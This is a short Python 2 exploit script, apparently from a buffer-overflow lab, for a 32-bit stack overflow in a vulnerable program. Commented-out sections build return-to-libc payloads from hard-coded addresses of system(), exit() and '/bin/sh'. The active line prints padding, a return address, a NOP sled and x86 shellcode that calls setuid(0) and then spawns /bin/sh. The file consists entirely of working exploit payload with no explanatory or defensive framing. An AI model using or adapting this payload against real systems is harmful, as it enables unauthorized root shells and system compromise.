# !/usr/bin/env python2
# import sys
# # Fill buffer with non-zero values
# buffer = bytearray(0x90 for i in range(300))

# sh_addr = 0xffffe510 # address of "/bin/sh"
# buffer[124:128] = (sh_addr).to_bytes(4,byteorder='little')

# exit_addr = 0xf7e0f990 # address of exit()
# buffer[120:124] = (exit_addr).to_bytes(4,byteorder='little')

# system_addr = 0xf7e1d040 # address of system()
# buffer[116:120] = (system_addr).to_bytes(4,byteorder='little')

# ========================================
# import struct

# # Define a function address (as an example)
# sh_addr = 0xf7f64338
# exit_addr = 0xf7e0f990
# system_addr = 0xf7e1d040 
# # buffer = bytearray("A" * 116, encoding='utf-8')
# buffer = bytearray(b'A' * 116)
# # Create a payload to place the function address on the stack
# buffer += struct.pack('<I', system_addr)  # little-endian architecture
# buffer += struct.pack('<I', exit_addr)
# buffer += struct.pack('<I', sh_addr)
buffer = "A" * 116  + "\x7c\xd1\xff\xff" + "\x90" * 40 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

print(buffer)